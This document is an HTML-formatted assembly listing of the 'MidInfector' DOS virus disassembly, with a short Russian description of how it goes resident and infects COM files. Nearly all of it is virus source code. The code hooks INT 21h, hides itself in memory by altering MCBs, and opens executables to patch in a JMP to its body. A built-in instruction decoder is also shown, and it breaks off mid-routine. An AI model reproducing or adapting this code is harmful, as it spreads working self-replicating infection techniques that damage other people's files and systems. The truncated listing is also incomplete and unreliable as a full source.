<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>MID.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                         MidInfector virus disassembly</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Безобидные резидентные вирусы. Перехватывают INT 21h и записываются в конец запускаемых</span><span class="sc0">
</span><span class="sc1">;  COM-файлов. "MidInfector.760,765" содержат строку:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  MidInfector by Dark Slayer of [TPVO]</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  При заражении записывают команду "JMP VirusCode" в середину файла: считывают файл в</span><span class="sc0">
</span><span class="sc1">;  память, дизассемблируют его код (вирусы содержат в себе примитивный дизассемблер) и</span><span class="sc0">
</span><span class="sc1">;  "идут" по коду файла до тех пор, пока не наткнутся на команду вызова прерывания,</span><span class="sc0">
</span><span class="sc1">;  условную передачу управления (Jcc), FAR JMP/CALL и некоторые другие. По тому адресу,</span><span class="sc0">
</span><span class="sc1">;  где произошла остановка дизассемблера, вирусы записывают команду JMP, передающую</span><span class="sc0">
</span><span class="sc1">;  управление на тело вируса.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc5">i21h_1</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">84h</span><span class="sc0">
</span><span class="sc5">i21h_2</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">86h</span><span class="sc0">
</span><span class="sc5">hadress</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">66h</span><span class="sc0">
</span><span class="sc5">hcode</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">83h</span><span class="sc0">
</span><span class="sc5">hcode2</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">84h</span><span class="sc0">
</span><span class="sc5">parame</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0C002h</span><span class="sc0">
</span><span class="sc5">parame2</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0C024h</span><span class="sc0">

</span><span class="sc5">mid</span><span class="sc0">     </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0">
</span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">mid</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">mid</span><span class="sc0">
</span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">midinf</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">far</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; start virus</span><span class="sc0">
</span><span class="sc6">pushf</span><span class="sc0">                   </span><span class="sc1">; push flags</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">; clear direction</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta_ofs</span><span class="sc0">

</span><span class="sc5">delta_ofs</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta_ofs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1888h</span><span class="sc0">            </span><span class="sc1">; check for TSR</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4D49h</span><span class="sc0">            </span><span class="sc1">; already resident?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">rez</span><span class="sc0">                  </span><span class="sc1">; equal? jump to rez</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">                      </span><span class="sc1">; find top of memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">           </span><span class="sc1">; (65536)</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">              </span><span class="sc1">; resize enough para's</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">31h</span><span class="sc0">              </span><span class="sc1">; for virus</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">rez</span><span class="sc0">                  </span><span class="sc1">; equal? jump to rez</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">31h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">; ax - 1 = MCB</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">8</span><span class="sc0">    </span><span class="sc1">; DOS = MCB owner</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2F8h</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2D1h</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">i21h_1</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">i21h_2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc5">rez</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">hcode</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">movsw</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">popf</span><span class="sc0">     </span><span class="sc1">; pop flags</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">xxx</span><span class="sc0">
</span><span class="sc5">xxx</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">                 </span><span class="sc1">; program terminate</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">info</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' MidInfector by Dark Slayer of [TPVO]  '</span><span class="sc0">
</span><span class="sc5">infect_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">cld</span><span class="sc0">                     </span><span class="sc1">; clear direction</span><span class="sc0">
</span><span class="sc5">zer</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; String [si] to al</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                </span><span class="sc1">; Zero ?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">zer</span><span class="sc0">                 </span><span class="sc1">; Jump if not zero</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'.'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                </span><span class="sc1">; Not equal? Jump to exit</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4F43h</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                </span><span class="sc1">; Not equal? Jump to exit</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0DFh</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                </span><span class="sc1">; Not equal? Jump to exit</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">              </span><span class="sc1">; allocate memory</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc0">                 </span><span class="sc1">; Jump if carry Set</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">            </span><span class="sc1">; Open file (read/write)</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">mez</span><span class="sc0">                  </span><span class="sc1">; Jump if carry Set</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; BX = file handle</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">              </span><span class="sc1">; Read from file</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0F000h</span><span class="sc0">
</span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">           </span><span class="sc1">; Error? Jump to close_file</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">           </span><span class="sc1">; Error? Jump to close_file</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">               </span><span class="sc1">; Zero register</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">17h</span><span class="sc0">              </span><span class="sc1">; MZ? - EXE file</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">           </span><span class="sc1">; Error? Jump to close_file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sub_3</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">; Zero register</span><span class="sc0">
</span><span class="sc6">cwd</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">close_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">              </span><span class="sc1">; close file</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">mez</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">49h</span><span class="sc0">              </span><span class="sc1">; allocate memory</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc5">exit</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc1">; exit</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">


</span><span class="sc5">sub_3</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc5">diz</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sub_4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
</span><span class="sc6">cbw</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc2">29Ch</span><span class="sc4">][</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">loc_8</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">diz</span><span class="sc0">
</span><span class="sc5">loc_8</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">hadress</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">                     </span><span class="sc1">; jump?</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">hcode</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">hcode2</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                       </span><span class="sc1">; zero register</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">2F8h</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">sub_3</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">sub_4</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc5">fid</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C4h</span><span class="sc0">                    </span><span class="sc1">; add/adc/and/or/sbb/sub/xor/cmp reg,reg???</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid2</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C2h</span><span class="sc0">                    </span><span class="sc1">; add/adc/and/or/sbb/sub/xor/cmp al/ax,xxxx???</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid3</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">fid3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E0h</span><span class="sc0">                    </span><span class="sc1">; push/pop reg? segment</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid4</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
</span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc5">fid4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C1h</span><span class="sc0">                    </span><span class="sc1">; ss/ds/es ??</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">fid5</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
